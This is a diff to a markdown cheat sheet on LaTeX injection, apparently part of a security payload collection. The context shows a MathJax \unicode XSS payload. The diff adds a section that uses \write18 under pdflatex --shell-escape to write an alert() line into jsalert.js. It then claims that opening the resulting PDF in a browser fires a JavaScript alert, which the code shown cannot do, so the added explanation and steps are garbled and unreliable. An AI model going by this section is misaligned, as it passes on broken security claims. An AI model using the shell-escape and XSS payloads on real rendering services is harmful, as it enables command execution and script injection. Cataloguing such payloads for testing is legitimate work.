@@ -10,6 +10,7 @@
     * [Write File](#write-file)
 * [Command Execution](#command-execution)
 * [Cross Site Scripting](#cross-site-scripting)
+* [Render LaTeX Code into Javascript Alerts](#render-latex-code-into-javascript-alerts)
 * [Labs](#labs)
 * [References](#references)
 
@@ -128,6 +129,51 @@ In [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.htm
 \unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
 ```
 
+## Render LaTeX Code into Javascript Alerts
+
+### Explanation
+
+To render LaTeX code into Javascript alerts, you can use the `\write18` command to execute shell commands. This command allows you to write the output of a shell command to a file, which can then be included in the LaTeX document. By writing a Javascript alert command to a file and then including that file in the LaTeX document, you can trigger a Javascript alert.
+
+### Example
+
+Here is an example of LaTeX code that triggers a Javascript alert:
+
+```tex
+\documentclass{article}
+\usepackage{amsmath}
+\begin{document}
+\title{LaTeX Injection Example}
+\author{Author Name}
+\date{\today}
+\maketitle
+
+\section{Introduction}
+This is an example of LaTeX injection.
+
+\section{Math Example}
+Here is a simple math equation:
+\begin{equation}
+E = mc^2
+\end{equation}
+
+\section{JavaScript Alert}
+\newcommand{\jsalert}[1]{\immediate\write18{echo "alert('#1');" > jsalert.js}}
+\jsalert{This is a JavaScript alert from LaTeX!}
+
+\end{document}
+```
+
+### Step-by-Step Guide
+
+1. Save the above LaTeX code to a file, for example, `latex_injection_example.tex`.
+2. Compile the LaTeX file using a LaTeX compiler, such as `pdflatex`:
+   ```sh
+   pdflatex --shell-escape latex_injection_example.tex
+   ```
+   The `--shell-escape` option is required to allow the execution of shell commands.
+3. Open the generated PDF file in a web browser that supports Javascript execution.
+4. The Javascript alert should be triggered, displaying the message "This is a JavaScript alert from LaTeX!".
 
 ## Labs
 
